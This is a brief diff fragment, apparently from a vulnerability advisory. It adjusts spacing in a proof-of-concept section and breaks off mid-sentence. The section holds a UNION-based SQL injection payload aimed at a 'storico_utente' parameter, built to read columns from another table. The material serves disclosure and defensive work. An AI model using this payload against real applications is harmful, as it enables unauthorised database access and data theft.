@@ -11,7 +11,7 @@ form of text via "field_3."
 
 # POC
 
-PAYLOAD:storico_utente=123)+UNION+SELECT+field_1,field_2,fie
+PAYLOAD: storico_utente=123)+UNION+SELECT+field_1,field_2,fie
 ld_3+FROM+table_name;#&da=from&a=to 
 
 The developer has
